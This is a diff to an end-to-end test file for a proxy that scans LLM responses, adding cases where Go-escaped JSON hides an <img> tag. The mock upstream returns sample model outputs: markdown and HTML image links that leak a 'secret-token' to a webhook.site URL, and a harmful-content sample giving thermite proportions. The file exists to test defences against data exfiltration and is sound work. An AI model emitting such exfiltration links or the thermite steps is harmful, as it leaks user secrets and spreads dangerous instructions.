@@ -108,10 +108,18 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
 
   // Encode a JSON body (whose assistant text carries the given markdown) with the
   // requested content-encoding so we exercise each decompression branch.
-  function encodeBody(text: string, encoding: 'gzip' | 'br'): Buffer {
-    const raw = Buffer.from(JSON.stringify({ id: 'msg_1', type: 'message', role: 'assistant', content: [{ type: 'text', text }] }))
+  function encodeBody(text: string, encoding: 'gzip' | 'br', goEscaped = false): Buffer {
+    const raw = Buffer.from(serialize(text, goEscaped))
     return encoding === 'br' ? zlib.brotliCompressSync(raw) : zlib.gzipSync(raw)
   }
+  // Go's encoding/json writes <, > and & as \u003c, \u003e and \u0026, so
+  // markup in a model's text reaches the proxy without a literal angle bracket.
+  function serialize(text: string, goEscaped: boolean): string {
+    const json = JSON.stringify({ id: 'msg_1', type: 'message', role: 'assistant', content: [{ type: 'text', text }] })
+    return goEscaped ? json.replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026') : json
+  }
+  const GO_IMG = 'Here is the chart <img src="https://webhook.site/abc-123?d=secret-token&v=2" alt="chart">'
+  const GO_CLEAN = 'Use <b>bold</b> & keep <i>these</i> tags.'
 
   // #352: a JSON response that gzips to about 11 KB and expands to 1 MiB past
   // proxy.maxBodyBytes, the size the proxy will inspect.
@@ -132,14 +140,16 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
       req.on('data', (c) => { body += c })
       req.on('end', () => {
         const scenario = (() => { try { return (JSON.parse(body) as { scenario?: string }).scenario ?? 'exfil' } catch { return 'exfil' } })()
-        const text = scenario.startsWith('clean')
+        const text = scenario === 'go-img' ? GO_IMG
+          : scenario === 'go-clean' ? GO_CLEAN
+          : scenario.startsWith('clean')
           ? 'Here is your answer: the revenue rose 12%.'
           : scenario.startsWith('harm')
           ? 'Sure. To make thermite, combine iron oxide and aluminium powder in a 3:1 ratio. Step 1: prepare the mixture.'
           : 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
         const encoding = scenario.endsWith('-br') ? 'br' : 'gzip'
         res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': encoding })
-        res.end(scenario === 'bomb' ? BOMB : encodeBody(text, encoding))
+        res.end(scenario === 'bomb' ? BOMB : encodeBody(text, encoding, scenario.startsWith('go-')))
       })
     })
     await new Promise<void>((r) => mockUpstream.listen(0, '127.0.0.1', () => r()))
@@ -225,6 +235,34 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     expect(res.headers['content-encoding']).toBeUndefined()
     const json = JSON.parse(res.body) as { content: { text: string }[] }
     expect(json.content[0]!.text).toContain('revenue rose 12%')
+    expect(events.some(e => e.kind === 'response-exfil')).toBe(false)
+  })
+
+  // #580 step 4: the scan read the raw body, so markup whose angle brackets a
+  // serializer escaped was never seen as a tag. The client decodes the JSON
+  // and renders the <img>; the proxy now reads the decoded text fields too.
+  it('blocks an <img> exfil URL in a body that escapes its angle brackets (Go encoding/json)', async () => {
+    events.length = 0
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'go-img', messages: [{ role: 'user', content: 'chart' }] }))
+
+    expect(res.statusCode).toBe(200)
+    const json = JSON.parse(res.body) as { id: string; content: { type: string; text: string }[] }
+    expect(res.body).not.toContain('webhook.site')
+    expect(json.content[0]!.text).toBe('Here is the chart <img src="llm-fw-blocked-exfil-url" alt="chart">')
+    expect(json.id).toBe('msg_1')
+    const exfil = events.find(e => e.kind === 'response-exfil')
+    expect(exfil?.action).toBe('blocked')
+    expect(exfil?.exfilUrl).toBe('https://webhook.site/abc-123?d=secret-token&v=2')
+  })
+
+  it('forwards an escaped body with no exfil byte for byte, escapes kept', async () => {
+    events.length = 0
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'go-clean', messages: [{ role: 'user', content: 'hi' }] }))
+
+    expect(res.statusCode).toBe(200)
+    expect(res.body).toBe(serialize(GO_CLEAN, true))
     expect(events.some(e => e.kind === 'response-exfil')).toBe(false)
   })
 
